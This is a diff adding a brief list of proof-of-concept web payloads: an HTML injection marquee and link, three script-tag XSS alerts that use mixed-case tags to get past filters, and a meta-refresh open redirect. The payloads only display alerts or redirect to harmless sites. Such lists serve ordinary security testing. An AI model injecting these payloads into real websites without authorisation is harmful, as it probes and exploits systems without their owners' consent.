@@ -1,0 +1,17 @@
+                  ***HTML Injection Payloads***
+
+1) <!DOCTYPE html> <html>     <head>       <title>HTML marquee Tag</title>    </head> 	    <body>       <marquee>HTML INJECTION POC DONE BY SHATHISH </marquee>    </body> 	 </html>
+2) <a href="https://bing.com" target="_blank" title="click here"><b>click here</b></a>
+
+                     ***XSS Payloads***
+
+2) <script>alert("1")</ScriPt>
+
+3) <script>alert("POC BY SHATHISH")</Script>
+
+4) <scrIpT>alert(document.domain)</scriPT>
+
+
+                 ***Open Redirection Payload***
+
+4) <!DOCTYPE html> <html> <meta http-equiv="refresh" content="0.9; url=http://www.google.com/">&lt;SUBSCRIBE TO OUR CHANNEL&gt; </html>
